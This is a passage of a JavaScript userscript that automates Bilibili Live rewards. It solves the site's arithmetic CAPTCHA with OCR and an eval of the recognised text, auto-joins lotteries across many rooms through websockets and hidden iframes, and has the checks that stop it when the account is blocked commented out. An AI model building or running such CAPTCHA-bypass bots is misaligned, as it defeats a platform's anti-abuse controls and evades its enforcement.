                        TreasureBox.DOM.div_timer = $(`<div id="${NAME}_treasure_div_timer" class="t-center b-box none-select">0</div>`);
                        TreasureBox.DOM.image = $(`<img id="${NAME}_treasure_image" style="display:none">`);
                        TreasureBox.DOM.canvas = $(`<canvas id="${NAME}_treasure_canvas" style="display:none" height="40" width="120"></canvas>`);
                        const css_text = 'min-width: 40px;padding: 2px 3px;margin-top: 3px;font-size: 12px;color: #fff;background-color: rgba(0,0,0,.5);border-radius: 10px;';
                        TreasureBox.DOM.div_tip[0].style = css_text;
                        TreasureBox.DOM.div_timer[0].style = css_text;
                        div.append(TreasureBox.DOM.div_tip);
                        div.append(TreasureBox.DOM.image);
                        div.append(TreasureBox.DOM.canvas);
                        TreasureBox.DOM.div_tip.after(TreasureBox.DOM.div_timer);
                        treasure_box.after(div);
                        if (!Info.mobile_verify) {
                            TreasureBox.setMsg('未绑定<br>手机');
                            window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
                            p.resolve();
                            return true;
                        }
                        try {
                            if (OCRAD);
                        } catch (err) {
                            TreasureBox.setMsg('初始化<br>失败');
                            window.toast('[自动领取瓜子]OCRAD初始化失败，请检查网络', 'error');
                            console.error(`[${NAME}]`, err);
                            p.resolve();
                            return true;
                        }
                        TreasureBox.timer = setInterval(() => {
                            let t = parseInt(TreasureBox.DOM.div_timer.text(), 10);
                            if (isNaN(t)) t = 0;
                            if (t > 0) TreasureBox.DOM.div_timer.text(`${t - 1}s`);
                            else TreasureBox.DOM.div_timer.hide();
                        }, 1e3);
                        TreasureBox.DOM.image[0].onload = () => {
                            // 实现功能类似 https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js 中Live.treasure.init()的验证码处理部分
                            const ctx = TreasureBox.DOM.canvas[0].getContext('2d');
                            ctx.font = '40px agencyfbbold';
                            ctx.textBaseline = 'top';
                            ctx.clearRect(0, 0, TreasureBox.DOM.canvas[0].width, TreasureBox.DOM.canvas[0].height);
                            ctx.drawImage(TreasureBox.DOM.image[0], 0, 0);
                            const grayscaleMap = TreasureBox.captcha.OCR.getGrayscaleMap(ctx);
                            const filterMap = TreasureBox.captcha.OCR.orderFilter2In3x3(grayscaleMap);
                            ctx.clearRect(0, 0, 120, 40);
                            for (let i = 0; i < filterMap.length; ++i) {
                                const gray = filterMap[i];
                                ctx.fillStyle = `rgb(${gray}, ${gray}, ${gray})`;
                                ctx.fillRect(i % 120, Math.round(i / 120), 1, 1);
                            }
                            try {
                                const question = TreasureBox.captcha.correctQuestion(OCRAD(ctx.getImageData(0, 0, 120, 40)));
                                DEBUG('TreasureBox.DOM.image.load', 'question =', question);
                                const answer = TreasureBox.captcha.eval(question);
                                DEBUG('TreasureBox.DOM.image.load', 'answer =', answer);
                                if (answer !== undefined) {
                                    // window.toast(`[自动领取瓜子]验证码识别结果: ${question} = ${answer}`, 'info');
                                    console.info(`[${NAME}][自动领取瓜子]验证码识别结果: ${question} = ${answer}`);
                                    TreasureBox.promise.calc.resolve(answer);
                                }
                            } catch (err) {
                                TreasureBox.promise.calc.reject();
                            }
                        };
                        p.resolve();
                        return true;
                    } catch (err) {
                        window.toast('[自动领取瓜子]初始化时出现异常，已停止', 'error');
                        console.error(`[${NAME}]`, err);
                        p.reject();
                        return true;
                    }
                });
                return p;
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_TREASUREBOX || !TreasureBox.timer) return;
                    if (Info.awardBlocked) {
                        TreasureBox.setMsg('瓜子小黑屋');
                        window.toast('[自动领取瓜子]帐号被关小黑屋，停止领取瓜子', 'caution');
                        return;
                    }
                    if (CACHE.treasure_box_ts && !checkNewDay(CACHE.treasure_box_ts)) {
                        TreasureBox.setMsg('今日<br>已领完');
                        runTomorrow(TreasureBox.run);
                        return;
                    }
                    TreasureBox.getCurrentTask().then((response) => {
                        DEBUG('TreasureBox.run: TreasureBox.getCurrentTask().then', response);
                        if (response.code === 0) {
                            // 获取任务成功
                            TreasureBox.promise.timer = $.Deferred();
                            TreasureBox.promise.timer.then(() => {
                                TreasureBox.captcha.calc().then((captcha) => {
                                    // 验证码识别完成
                                    TreasureBox.getAward(captcha).then(() => TreasureBox.run(), () => TreasureBox.run());
                                }, () => TreasureBox.run());
                            });
                            TreasureBox.time_end = response.data.time_end;
                            TreasureBox.time_start = response.data.time_start;
                            let t = TreasureBox.time_end - ts_s() + 1;
                            if (t < 0) t = 0;
                            setTimeout(() => {
                                if (TreasureBox.promise.timer) TreasureBox.promise.timer.resolve();
                            }, t * 1e3);
                            TreasureBox.DOM.div_timer.text(`${t}s`);
                            TreasureBox.DOM.div_timer.show();
                            TreasureBox.DOM.div_tip.html(`次数<br>${response.data.times}/${response.data.max_times}<br>银瓜子<br>${response.data.silver}`);
                        } else if (response.code === -10017) {
                            // 今天所有的宝箱已经领完!
                            TreasureBox.setMsg('今日<br>已领完');
                            // window.toast(`[自动领取瓜子]${response.msg}`, 'info');
                            CACHE.treasure_box_ts = ts_ms();
                            Essential.Cache.save();
                            runTomorrow(TreasureBox.run);
                        } else if (response.code === -500) {
                            // 请先登录!
                            location.reload();
                        } else {
                            window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                            return TreasureBox.run();
                        }
                    });
                } catch (err) {
                    TreasureBox.setMsg('运行<br>异常');
                    window.toast('[自动领取瓜子]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                }
            },
            setMsg: (htmltext) => {
                if (!CONFIG.AUTO_TREASUREBOX) return;
                if (TreasureBox.promise.timer) {
                    TreasureBox.promise.timer.reject();
                    TreasureBox.promise.timer = undefined;
                }
                if (TreasureBox.DOM.div_timer) TreasureBox.DOM.div_timer.hide();
                if (TreasureBox.DOM.div_tip) TreasureBox.DOM.div_tip.html(htmltext);
            },
            getAward: (captcha, cnt = 0) => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
                if (cnt > 3) return $.Deferred().resolve(); // 3次时间未到，重新运行任务
                return API.TreasureBox.getAward(TreasureBox.time_start, TreasureBox.time_end, captcha).then((response) => {
                    DEBUG('TreasureBox.getAward: getAward', response);
                    switch (response.code) {
                        case 0:
                            window.toast(`[自动领取瓜子]领取了 ${response.data.awardSilver} 银瓜子`, 'success');
                        case -903: // -903: 已经领取过这个宝箱
                            // window.toast('[自动领取瓜子]已经领取过这个宝箱', 'caution');
                            return $.Deferred().resolve();
                        case -902: // -902: 验证码错误
                        case -901: // -901: 验证码过期
                            return TreasureBox.captcha.calc().then((captcha) => {
                                return TreasureBox.getAward(captcha, cnt);
                            });
                        case -800: // -800：未绑定手机
                            TreasureBox.setMsg('未绑定<br>手机');
                            window.toast('[自动领取瓜子]未绑定手机，已停止', 'caution');
                            return $.Deferred().reject();
                        case -500: // -500：领取时间未到, 请稍后再试
                            {
                                const p = $.Deferred();
                                setTimeout(() => {
                                    TreasureBox.captcha.calc().then((captcha) => {
                                        TreasureBox.getAward(captcha, cnt + 1).then(() => p.resolve(), () => p.reject());
                                    }, () => p.reject());
                                }, 3e3);
                                return p;
                            }
                        case 400: // 400: 访问被拒绝
                            if (response.msg.indexOf('拒绝') > -1) {
                                Info.awardBlocked = true;
                                Essential.DataSync.down();
                                TreasureBox.setMsg('拒绝<br>访问');
                                window.toast('[自动领取瓜子]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                return $.Deferred().reject();
                            }
                            window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                            return $.Deferred().resolve();
                        default: // 其他错误
                            window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[自动领取瓜子]获取任务失败，请检查网络', 'error');
                    return delayCall(() => TreasureBox.getAward(captcha, cnt));
                });
            },
            getCurrentTask: () => {
                if (!CONFIG.AUTO_TREASUREBOX) return $.Deferred().reject();
                return API.TreasureBox.getCurrentTask().then((response) => {
                    DEBUG('TreasureBox.getCurrentTask: API.TreasureBox.getCurrentTask', response);
                    return $.Deferred().resolve(response);
                }, () => {
                    window.toast('[自动领取瓜子]获取当前任务失败，请检查网络', 'error');
                    return delayCall(() => TreasureBox.getCurrentTask());
                });
            },
            captcha: {
                cnt: 0,
                calc: () => {
                    if (!CONFIG.AUTO_TREASUREBOX) {
                        TreasureBox.captcha.cnt = 0;
                        return $.Deferred().reject();
                    }
                    if (TreasureBox.captcha.cnt > 100) { // 允许验证码无法识别的次数
                        // 验证码识别失败
                        TreasureBox.setMsg('验证码<br>识别<br>失败');
                        window.toast('[自动领取瓜子]验证码识别失败，已停止', 'error');
                        return $.Deferred().reject();
                    }
                    return API.TreasureBox.getCaptcha(ts_ms()).then((response) => {
                        DEBUG('TreasureBox.captcha.calc: getCaptcha', response);
                        if (response.code === 0) {
                            TreasureBox.captcha.cnt++;
                            const p = $.Deferred();
                            TreasureBox.promise.calc = $.Deferred();
                            TreasureBox.promise.calc.then((captcha) => {
                                TreasureBox.captcha.cnt = 0;
                                p.resolve(captcha);
                            }, () => {
                                TreasureBox.captcha.calc().then((captcha) => {
                                    p.resolve(captcha);
                                }, () => {
                                    p.reject();
                                });
                            });
                            TreasureBox.DOM.image.attr('src', response.data.img);
                            return p;
                        } else {
                            window.toast(`[自动领取瓜子]${response.msg}`, 'caution');
                            return delayCall(() => TreasureBox.captcha.calc());
                        }
                    }, () => {
                        window.toast('[自动领取瓜子]加载验证码失败，请检查网络', 'error');
                        return delayCall(() => TreasureBox.captcha.calc());
                    });
                },
                // 对B站验证码进行处理
                // 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
                // 删除了未使用的变量
                OCR: {
                    getGrayscaleMap: (context, rate = 235, width = 120, height = 40) => {
                        function getGrayscale(x, y) {
                            const pixel = context.getImageData(x, y, 1, 1).data;
                            return pixel ? (77 * pixel[0] + 150 * pixel[1] + 29 * pixel[2] + 128) >> 8 : 0;
                        }
                        const map = [];
                        for (let y = 0; y < height; y++) { // line y
                            for (let x = 0; x < width; x++) { // column x
                                const gray = getGrayscale(x, y);
                                map.push(gray > rate ? gray : 0);
                            }
                        }
                        return map;
                    },
                    orderFilter2In3x3: (grayscaleMap, n = 9, width = 120) => {
                        const gray = (x, y) => (x + y * width >= 0) ? grayscaleMap[x + y * width] : 255;
                        const map = [];
                        const length = grayscaleMap.length;
                        const catchNumber = n - 1;
                        for (let i = 0; i < length; ++i) {
                            const [x, y] = [i % width, Math.floor(i / width)];
                            const matrix = new Array(9);
                            matrix[0] = gray(x - 1, y - 1);
                            matrix[1] = gray(x + 0, y - 1);
                            matrix[2] = gray(x + 1, y - 1);
                            matrix[3] = gray(x - 1, y + 0);
                            matrix[4] = gray(x + 0, y + 0);
                            matrix[5] = gray(x + 1, y + 0);
                            matrix[6] = gray(x - 1, y + 1);
                            matrix[7] = gray(x + 0, y + 1);
                            matrix[8] = gray(x + 1, y + 1);
                            matrix.sort((a, b) => a - b);
                            map.push(matrix[catchNumber]);
                        }
                        return map;
                    },
                    execMap: (connectMap, rate = 4) => {
                        const map = [];
                        const connectMapLength = connectMap.length;
                        for (let i = 0; i < connectMapLength; ++i) {
                            let blackPoint = 0;
                            // const [x, y] = [i % 120, Math.round(i / 120)];
                            const top = connectMap[i - 120];
                            const topLeft = connectMap[i - 120 - 1];
                            const topRight = connectMap[i - 120 + 1];
                            const left = connectMap[i - 1];
                            const right = connectMap[i + 1];
                            const bottom = connectMap[i + 120];
                            const bottomLeft = connectMap[i + 120 - 1];
                            const bottomRight = connectMap[i + 120 + 1];
                            if (top) blackPoint += 1;
                            if (topLeft) blackPoint += 1;
                            if (topRight) blackPoint += 1;
                            if (left) blackPoint += 1;
                            if (right) blackPoint += 1;
                            if (bottom) blackPoint += 1;
                            if (bottomLeft) blackPoint += 1;
                            if (bottomRight) blackPoint += 1;
                            if (blackPoint > rate) map.push(1);
                            else map.push(0);
                        }
                        return map;
                    }
                },
                eval: (fn) => {
                    let Fn = Function;
                    return new Fn(`return ${fn}`)();
                },
                // 修正OCRAD识别结果
                // 代码来源：https://github.com/zacyu/bilibili-helper/blob/master/src/bilibili_live.js
                // 修改部分：
                // 1.将correctStr声明在correctQuestion函数内部，并修改相关引用
                // 2.在correctStr中增加'>': 3
                correctStr: {
                    'g': 9,
                    'z': 2,
                    'Z': 2,
                    'o': 0,
                    'l': 1,
                    'B': 8,
                    'O': 0,
                    'S': 6,
                    's': 6,
                    'i': 1,
                    'I': 1,
                    '.': '-',
                    '_': 4,
                    'b': 6,
                    'R': 8,
                    '|': 1,
                    'D': 0,
                    '>': 3
                },
                correctQuestion: (question) => {
                    let q = '';
                    question = question.trim();
                    for (let i in question) {
                        let a = TreasureBox.captcha.correctStr[question[i]];
                        q += (a !== undefined ? a : question[i]);
                    }
                    if (q[2] === '4') q[2] = '+';
                    return q;
                }
            }
        }; // Constantly Run, Need Init

        const Lottery = {
            hasWS: false,
            createCount: 0,
            roomidSet: new Set(),
            listenSet: new Set(),
            Gift: {
                _join: (roomid, raffleId, type, time_wait = 0) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    raffleId = parseInt(raffleId, 10);
                    if (isNaN(roomid) || isNaN(raffleId)) return $.Deferred().reject();
                    return delayCall(() => API.Lottery.Gift.join(roomid, raffleId, type).then((response) => {
                        DEBUG('Lottery.Gift._join: API.Lottery.Gift.join', response);
                        switch (response.code) {
                            case 0:
                                window.toast(`[自动抽奖][礼物抽奖]已参加抽奖(roomid=${roomid},id=${raffleId},type=${type})`, 'success');
                                break;
                            case 402:
                                // 抽奖已过期，下次再来吧
                                break;
                            case 65531:
                                // 65531: 非当前直播间或短ID直播间试图参加抽奖
                                //Info.blocked = true;
                                Essential.DataSync.down();
                                window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，已停止`, 'error');
                                break;
                            default:
                                if (response.msg.indexOf('拒绝') > -1) {
                                    //Info.blocked = true;
                                    //Essential.DataSync.down();
                                    //window.toast('[自动抽奖][礼物抽奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                                } else if (response.msg.indexOf('快') > -1) {
                                    return delayCall(() => Lottery.Gift._join(roomid, raffleId));
                                } else {
                                    window.toast(`[自动抽奖][礼物抽奖](roomid=${roomid},id=${raffleId},type=${type})${response.msg}`, 'caution');
                                }
                        }
                    }, () => {
                        window.toast(`[自动抽奖][礼物抽奖]参加抽奖(roomid=${roomid},id=${raffleId},type=${type})失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.Gift._join(roomid, raffleId));
                    }), time_wait * 1e3 + 5e3);
                }
            },
            Guard: {
                wsList: [],
                _join: (roomid, id) => {
                    //if (Info.blocked) return $.Deferred().resolve();
                    roomid = parseInt(roomid, 10);
                    id = parseInt(id, 10);
                    if (isNaN(roomid) || isNaN(id)) return $.Deferred().reject();
                    return API.Lottery.Guard.join(roomid, id).then((response) => {
                        DEBUG('Lottery.Guard._join: API.Lottery.Guard.join', response);
                        if (response.code === 0) {
                            window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})成功`, 'success');
                        } else if (response.msg.indexOf('拒绝') > -1) {
                            //Info.blocked = true;
                            //Essential.DataSync.down();
                            //window.toast('[自动抽奖][舰队领奖]访问被拒绝，您的帐号可能已经被关小黑屋，已停止', 'error');
                        } else if (response.msg.indexOf('快') > -1) {
                            return delayCall(() => Lottery.Guard._join(roomid, id));
                        } else if (response.msg.indexOf('过期') > -1) {
                        } else {
                            window.toast(`[自动抽奖][舰队领奖](roomid=${roomid},id=${id})${response.msg}`, 'caution');
                        }
                    }, () => {
                        window.toast(`[自动抽奖][舰队领奖]领取(roomid=${roomid},id=${id})失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.Guard._join(roomid, id));
                    });
                }
            },
            MaterialObject: {
                list: [],
                ignore_keyword: ['test', 'encrypt', '测试', '钓鱼', '加密', '炸鱼'],
                run: () => {
                    try {
                        if (CACHE.materialobject_ts) {
                            const diff = ts_ms() - CACHE.materialobject_ts;
                            const interval = CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL * 60e3 || 600e3;
                            if (diff < interval) {
                                setTimeout(Lottery.MaterialObject.run, interval - diff);
                                return $.Deferred().resolve();
                            }
                        }
                        return Lottery.MaterialObject.check().then((aid) => {
                            if (aid) { // aid有效
                                CACHE.last_aid = aid;
                                CACHE.materialobject_ts = ts_ms();
                                Essential.Cache.save();
                            }
                            setTimeout(Lottery.MaterialObject.run, CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL * 60e3 || 600e3);
                        }, () => delayCall(() => Lottery.MaterialObject.run()));
                    } catch (err) {
                        window.toast('[自动抽奖][实物抽奖]运行时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                check: (aid, valid = 564, rem = 9) => { // TODO
                    aid = parseInt(aid || (CACHE.last_aid), 10);
                    if (isNaN(aid)) aid = valid;
                    DEBUG('Lottery.MaterialObject.check: aid=', aid);
                    return API.Lottery.MaterialObject.getStatus(aid).then((response) => {
                        DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.getStatus', response);
                        if (response.code === 0 && response.data) {
                            if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.IGNORE_QUESTIONABLE_LOTTERY && Lottery.MaterialObject.ignore_keyword.some(v => response.data.title.toLowerCase().indexOf(v) > -1)) {
                                window.toast(`[自动抽奖][实物抽奖]忽略抽奖(aid=${aid})`, 'info');
                                return Lottery.MaterialObject.check(aid + 1, aid);
                            } else {
                                return Lottery.MaterialObject.join(aid, response.data.title, response.data.typeB).then(() => Lottery.MaterialObject.check(aid + 1, aid));
                            }
                        } else if (response.code === -400 || response.data == null ) { // 活动不存在
                            if (rem) return Lottery.MaterialObject.check(aid + 1, valid, rem - 1);
                            return $.Deferred().resolve(valid);
                        } else {
                            window.toast(`[自动抽奖][实物抽奖]${response.msg}`, 'info');
                        }
                    }, () => {
                        window.toast(`[自动抽奖][实物抽奖]检查抽奖(aid=${aid})失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.MaterialObject.check(aid, valid));
                    });
                },
                join: (aid, title, typeB, i = 0) => {
                    if (i >= typeB.length) return $.Deferred().resolve();
                    if (Lottery.MaterialObject.list.some(v => v.aid === aid && v.number === i + 1)) return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
                    const number = i + 1;
                    const obj = {
                        title: title,
                        aid: aid,
                        number: number,
                        status: typeB[i].status,
                        join_start_time: typeB[i].join_start_time,
                        join_end_time: typeB[i].join_end_time
                    };
                    switch (obj.status) {
                        case -1: // 未开始
                            {
                                Lottery.MaterialObject.list.push(obj);
                                const p = $.Deferred();
                                p.then(() => {
                                    return Lottery.MaterialObject.draw(obj);
                                });
                                setTimeout(() => {
                                    p.resolve();
                                }, (obj.join_start_time - ts_s() + 1) * 1e3);
                            }
                            break;
                        case 0: // 可参加
                            return Lottery.MaterialObject.draw(obj).then(() => {
                                return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
                            });
                        case 1: // 已参加
                            {
                                Lottery.MaterialObject.list.push(obj);
                                const p = $.Deferred();
                                p.then(() => {
                                    return Lottery.MaterialObject.notice(obj);
                                });
                                setTimeout(() => {
                                    p.resolve();
                                }, (obj.join_end_time - ts_s() + 1) * 1e3);
                            }
                            break;
                    }
                    return Lottery.MaterialObject.join(aid, title, typeB, i + 1);
                },
                draw: (obj) => {
                    return API.Lottery.MaterialObject.draw(obj.aid, obj.number).then((response) => {
                        DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.draw', response);
                        if (response.code === 0) {
                            $.each(Lottery.MaterialObject.list, (i, v) => {
                                if (v.aid === obj.aid && v.number === obj.number) {
                                    v.status = 1;
                                    Lottery.MaterialObject.list[i] = v;
                                    return false;
                                }
                            });
                            const p = $.Deferred();
                            p.then(() => {
                                return Lottery.MaterialObject.notice(obj);
                            });
                            setTimeout(() => {
                                p.resolve();
                            }, (obj.join_end_time - ts_s() + 1) * 1e3);
                        } else {
                            window.toast(`[自动抽奖][实物抽奖]"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`, 'caution');
                        }
                    }, () => {
                        window.toast(`[自动抽奖][实物抽奖]参加"${obj.title}"(aid=${obj.aid},number=${obj.number})失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.MaterialObject.draw(obj));
                    });
                },
                notice: (obj) => {
                    return API.Lottery.MaterialObject.getWinnerGroupInfo(obj.aid, obj.number).then((response) => {
                        DEBUG('Lottery.MaterialObject.check: API.Lottery.MaterialObject.getWinnerGroupInfo', response);
                        if (response.code === 0) {
                            $.each(Lottery.MaterialObject.list, (i, v) => {
                                if (v.aid === obj.aid && v.number === obj.number) {
                                    v.status = 3;
                                    Lottery.MaterialObject.list[i] = v;
                                    return false;
                                }
                            });
                            $.each(response.data.winnerList, (i, v) => {
                                if (v.uid === Info.uid) {
                                    window.toast(`[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})获得奖励"${v.giftTitle}"`, 'info');
                                    return false;
                                }
                            });
                        } else {
                            window.toast(`[自动抽奖][实物抽奖]抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})${response.msg}`, 'caution');
                        }
                    }, () => {
                        window.toast(`[自动抽奖][实物抽奖]获取抽奖"${obj.title}"(aid=${obj.aid},number=${obj.number})中奖名单失败，请检查网络`, 'error');
                        return delayCall(() => Lottery.MaterialObject.notice(obj));
                    });
                }
            },
            create: (roomid, real_roomid, type, link_url) => {
                if (Lottery.createCount > 99) location.reload();
                if (!real_roomid) real_roomid = roomid;
                if (Info.roomid === real_roomid) return;
                // roomid过滤，防止创建多个同样roomid的iframe
                if (Lottery.roomidSet.has(real_roomid)) return;
                Lottery.roomidSet.add(real_roomid);
                const iframe = $('<iframe style="display: none;"></iframe>')[0];
                iframe.name = real_roomid;
                let url;
                if (link_url) url = `${link_url.replace('https:', '').replace('http:', '')}` + (Info.visit_id ? `&visit_id=${Info.visit_id}` : '');
                else url = `//live.bilibili.com/${roomid}` + (Info.visit_id ? `?visit_id=${Info.visit_id}` : '');
                iframe.src = url;
                document.body.appendChild(iframe);
                const pFinish = $.Deferred();
                pFinish.then(() => {
                    window[NAME].iframeSet.delete(iframe);
                    $(iframe).remove();
                    Lottery.roomidSet.delete(real_roomid);
                });
                const autoDel = setTimeout(() => pFinish.resolve(), 60e3); // iframe默认在60s后自动删除
                const pInit = $.Deferred();
                pInit.then(() => clearTimeout(autoDel)); // 如果初始化成功，父脚本不自动删除，由子脚本决定何时删除，否则说明子脚本加载失败，这个iframe没有意义
                const up = () => {
                    CACHE = window[NAME].CACHE;
                    Info = window[NAME].Info;
                    Essential.Cache.save();
                    const pUp = $.Deferred();
                    pUp.then(up);
                    iframe[NAME].promise.up = pUp;
                };
                const pUp = $.Deferred();
                pUp.then(up);
                iframe[NAME] = {
                    roomid: real_roomid,
                    type: type,
                    promise: {
                        init: pInit, // 这个Promise在子脚本加载完成时resolve
                        finish: pFinish, // 这个Promise在iframe需要删除时resolve
                        down: $.Deferred(), // 这个Promise在子脚本的CONIG、CACHE、Info等需要重新读取时resolve
                        up: pUp
                    }
                };
                window[NAME].iframeSet.add(iframe);
                ++Lottery.createCount;
                DEBUG('Lottery.create: iframe', iframe);
            },
            listen: (uid, roomid, area = '', gift = false, volatile = true) => {
                if (Lottery.listenSet.has(roomid)) return;
                Lottery.listenSet.add(roomid);
                return API.room.getConf(roomid).then((response) => {
                    DEBUG('Lottery.listen: API.room.getConf', response);
                    //if (Info.blocked) return;
                    let ws = new API.DanmuWebSocket(uid, roomid, response.data.host_server_list, response.data.token);
                    let id = 0;
                    if (volatile) id = Lottery.Guard.wsList.push(ws);
                    ws.bind((newws) => {
                        if (volatile && id) Lottery.Guard.wsList[id - 1] = newws;
                        window.toast(`[自动抽奖]${area}(${roomid})弹幕服务器连接断开，尝试重连`, 'caution');
                    }, () => {
                        window.toast(`[自动抽奖]${area}(${roomid})连接弹幕服务器成功`, 'success');
                        //if (CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY || CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) Lottery.create(roomid, roomid, 'LOTTERY');
                    }, (num) => {
                        //console.log(`房间${roomid}，人气值：${num}`);
                        //if (Info.blocked) {
                        //    ws.close();
                        //    window.toast(`[自动抽奖]${area}(${roomid})主动与弹幕服务器断开连接`, 'info');
                        //}
                    }, (obj, str) => {
                        switch (obj.cmd) {
                            case 'DANMU_MSG':
                            case 'SEND_GIFT':
                            case 'ENTRY_EFFECT':
                            case 'WELCOME':
                            case 'WELCOME_GUARD':
                            case 'COMBO_SEND':
                            case 'COMBO_END':
                            case 'WISH_BOTTLE':
                            case 'ROOM_RANK':
                            case 'ROOM_REAL_TIME_MESSAGE_UPDATE':
                                break;
                            case 'NOTICE_MSG':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                switch (obj.msg_type) {
                                    case 1:
                                        // 系统
                                        break;
                                    case 2:
                                    case 8:
                                        // 礼物抽奖
                                        if (!CONFIG.AUTO_LOTTERY) break;
                                        if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
                                        //if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
                                        BiliPushUtils.Gift.run(obj.real_roomid);
                                        break;
                                    case 3:
                                        // 舰队领奖
                                        if (!CONFIG.AUTO_LOTTERY) break;
                                        if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
                                        //if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
                                        BiliPushUtils.Guard.run(obj.real_roomid);
                                        break;
                                    case 4:
                                        // 登船
                                        break;
                                    case 5:
                                        // 获奖
                                        break;
                                    case 6:
                                        // 节奏风暴
                                        if (!CONFIG.AUTO_LOTTERY) break;
                                        //if (Info.blocked || !obj.roomid || !obj.real_roomid) break;
                                        BiliPushUtils.Storm.run(roomid);
                                        break;
                                }
                                break;
                            case 'GUARD_LOTTERY_START':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                if (!CONFIG.AUTO_LOTTERY) break;
                                if (!CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) break;
                                //if (Info.blocked || !obj.data.roomid || !obj.data.lottery.id) break;
                                if (obj.data.roomid === Info.roomid) {
                                    Lottery.Guard._join(Info.roomid, obj.data.lottery.id);
                                }
                                else{
                                    BiliPushUtils.Guard.run(obj.data.roomid);
                                }
                                break;
                            case 'RAFFLE_START':
                            case 'TV_START':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                if (!CONFIG.AUTO_LOTTERY) break;
                                if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY) break;
                                //if (Info.blocked || !obj.data.msg.roomid || !obj.data.msg.real_roomid || !obj.data.raffleId) break;
                                if (obj.data.msg.real_roomid === Info.roomid)
                                {
                                    Lottery.Gift._join(Info.roomid, obj.data.raffleId, obj.data.type, obj.data.time_wait);
                                }
                                else {
                                    BiliPushUtils.Gift.run(obj.data.msg.real_roomid);
                                }
                                break;
                            case 'SPECIAL_GIFT':
                                DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                if (!CONFIG.AUTO_LOTTERY) break;
                                if (obj.data['39']) {
                                    switch (obj.data['39'].action) {
                                        case 'start':
                                            // 节奏风暴开始
                                            BiliPushUtils.Storm.run(roomid);
                                        case 'end':
                                            // 节奏风暴结束
                                    }
                                };
                                break;
                            default:
                                if (gift) DEBUG(`DanmuWebSocket${area}(${roomid})`, str);
                                break;
                        }
                    });
                }, () => delayCall(() => Lottery.listen(uid, roomid, area, volatile)));
            },
            listenAll: () => {
                //if (Info.blocked) return;
                if (!Lottery.hasWS) {
                    Lottery.listen(Info.uid, Info.roomid, '', true, false);
                    Lottery.hasWS = true;
                }
                Lottery.Guard.wsList.forEach(v => v.close());
                Lottery.Guard.wsList = [];
                Lottery.listenSet = new Set();
                Lottery.listenSet.add(Info.roomid);
                const fn1 = () => {
                    return API.room.getList().then((response) => {
                        DEBUG('Lottery.listenAll: API.room.getList', response);
                        for (const obj of response.data) {
                            fn2(obj);
                        }
                    }, () => delayCall(() => fn1()));
                };
                const fn2 = (obj) => {
                    return API.room.getRoomList(obj.id, 0, 0, 1, CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD ? CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER : 1).then((response) => {
                        DEBUG('Lottery.listenAll: API.room.getRoomList', response);
                        for (let j = 0; j < response.data.length; ++j) {
                            Lottery.listen(Info.uid, response.data[j].roomid, `[${obj.name}区]`, !j, true);
                        }
                    }, () => delayCall(() => fn2(obj)));
                };
                fn1();
            },
            run: () => {
                try {
                    if (!CONFIG.AUTO_LOTTERY) return;
                    if (Info.blocked) {
                        //window.toast('[自动抽奖]帐号被关小黑屋，停止自动抽奖', 'caution');
                        //return;
                    }
                    if (CONFIG.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY) Lottery.MaterialObject.run();
                    if (!CONFIG.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY && !CONFIG.AUTO_LOTTERY_CONFIG.GUARD_AWARD) {
                        window.toast('[自动抽奖]不需要连接弹幕服务器', 'info');
                        return;
                    }
                    if (CONFIG.AUTO_LOTTERY_CONFIG.HIDE_POPUP) {
                        addCSS('#chat-popup-area-vm {display: none;}');
                    }
                    Lottery.listenAll();
